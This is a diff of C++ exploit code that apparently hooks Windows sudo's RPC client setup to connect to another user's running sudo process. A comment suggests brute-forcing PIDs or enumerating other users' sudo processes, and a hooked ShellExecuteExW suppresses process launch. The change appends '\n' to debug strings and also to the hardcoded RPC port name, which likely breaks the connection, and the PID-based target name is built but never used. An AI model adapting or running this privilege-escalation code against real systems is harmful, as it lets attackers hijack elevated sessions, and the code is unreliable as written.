@@ -56,15 +56,15 @@ unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
     // A more robust exploit would brute force this, either by just trying all valid PIDs
     // for the numbers or by enumerating running sudo.exe processes for other users using createtoolhelp32snapshot
     char target_rpc_object[260];
-    OutputDebugStringA("Finding target PID...");
+    OutputDebugStringA("Finding target PID...\n");
     DWORD target_pid = FindRunningSudo();
     snprintf(target_rpc_object, 260, kSudoRpcFormat, target_pid);
     OutputDebugStringA(target_rpc_object);
-    return OriginalSetupClient("sudo_elevate_9868");
+    return OriginalSetupClient("sudo_elevate_9868\n");
 }
 
 BOOL HookedShellExecuteExW(SHELLEXECUTEINFOW* pExecInfo) {
-    OutputDebugStringA("Not running shell exec...");
+    OutputDebugStringA("Not running shell exec...\n");
     return TRUE;
 }
 
